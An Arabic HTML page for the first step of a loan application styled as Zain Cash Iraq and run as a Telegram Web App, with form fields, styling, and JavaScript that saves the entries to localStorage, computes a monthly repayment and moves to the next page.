<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>طلب التمويل - الخطوة 1</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #f4f4f7; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .nav-header { width: 100%; background: linear-gradient(135deg, #581d72, #a1278a); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
        .zain-logo { font-size: 20px; font-weight: bold; }
        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 8px 20px rgba(88, 29, 114, 0.12); box-sizing: border-box; }
        h2 { text-align: center; margin: 0; font-size: 24px; color: #222; font-weight: 600; }
        .step-info { text-align: center; font-size: 14px; color: #777; margin: 10px 0 25px; }
        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
        .active-bar { background: #8c237e; }
        .input-wrap { margin-bottom: 22px; }
        label { display: block; font-size: 15px; font-weight: 500; margin-bottom: 10px; color: #444; }
        select, input, textarea { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 16px; box-sizing: border-box; background: #fff; font-family: inherit; }
        select:focus, input:focus, textarea:focus { border-color: #8c237e; outline: none; }
        .btn-container { margin-top: 30px; display: flex; flex-direction: column; gap: 15px; }
        .back-btn { background-color: #f1f1f5; color: #666; border: 1px solid #ddd; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .next-btn { background: linear-gradient(135deg, #8c237e, #581d72); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 12px rgba(140, 35, 126, 0.25); text-transform: uppercase; }
        .footer-text { text-align: center; font-size: 12px; color: #aaa; margin-top: 40px; padding-bottom: 30px; }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← رجوع</div>
    <div class="zain-logo">زين كاش</div>
    <div style="font-size: 22px;">☰</div>
</div>

<div class="form-card">
    <h2>طلب التمويل</h2>
    <p class="step-info">الخطوة 1 من 3</p>

    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>نوع التمويل</label>
        <select id="loanType">
            <option value="تمويل شخصي" selected>تمويل شخصي</option>
            <option value="تمويل تجاري">تمويل تجاري</option>
            <option value="تمويل سيارات">تمويل سيارات</option>
            <option value="تمويل عقاري">تمويل عقاري</option>
            <option value="تمويل دراسي">تمويل دراسي</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>مبلغ التمويل (د.ع)</label>
        <input type="text" id="loanAmount" readonly style="background:#f9f9f9">
    </div>

    <div class="input-wrap">
        <label>مدة السداد</label>
        <input type="text" id="loanDuration" readonly style="background:#f9f9f9">
    </div>

    <div class="input-wrap">
        <label>الغرض من التمويل</label>
        <textarea id="loanPurpose" rows="3" placeholder="ما هو الغرض من استخدام هذا التمويل؟"></textarea>
    </div>

    <div class="btn-container">
        <button class="back-btn" onclick="goBack()">السابق</button>
        <button class="next-btn" onclick="goNext()">الخطوة التالية</button>
    </div>
</div>

<div class="footer-text">© 2026 زين كاش العراق. جميع الحقوق محفوظة.</div>

<script>
    function goNext() {
        const purposeEl = document.getElementById('loanPurpose');
        const typeEl = document.getElementById('loanType');
        const amountVal = document.getElementById('loanAmount').value;
        const durationVal = document.getElementById('loanDuration').value;

        if (!purposeEl || !typeEl) return;

        const purpose = purposeEl.value.trim();
        const type = typeEl.value;

        if (!purpose) {
            alert("يرجى إدخال الغرض من التمويل.");
            return;
        }

        // --- Standard Save ---
        localStorage.setItem('loanPurpose', purpose);
        localStorage.setItem('loanType', type);

        // --- Success Page Save (Carrying data forward) ---
        const cleanDuration = durationVal.replace(/\D/g, ''); 
        const cleanAmount = amountVal.replace(/[^\d]/g, '');
        
        const monthly = Math.round((Number(cleanAmount) * 1.18) / Number(cleanDuration));

        localStorage.setItem('loan_amount', cleanAmount);
        localStorage.setItem('loan_term', cleanDuration);
        localStorage.setItem('monthly_repayment', monthly);

        window.location.href = "page3.html";
    }

    function goBack() {
        window.location.href = "index.html";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;

        if (tg) {
            tg.ready();
            tg.expand();
        }

        const amountEl = document.getElementById('loanAmount');
        const durationEl = document.getElementById('loanDuration');

        if (amountEl && durationEl) {
            const rawAmount = localStorage.getItem('amount') || "1000000";
            const numericAmount = rawAmount.replace(/[^\d]/g, '');
            amountEl.value = Number(numericAmount).toLocaleString('ar-IQ') + " د.ع";
            durationEl.value = String(localStorage.getItem('loanDuration') || "12 شهر");
        }
    };
</script>

</body>
</html>
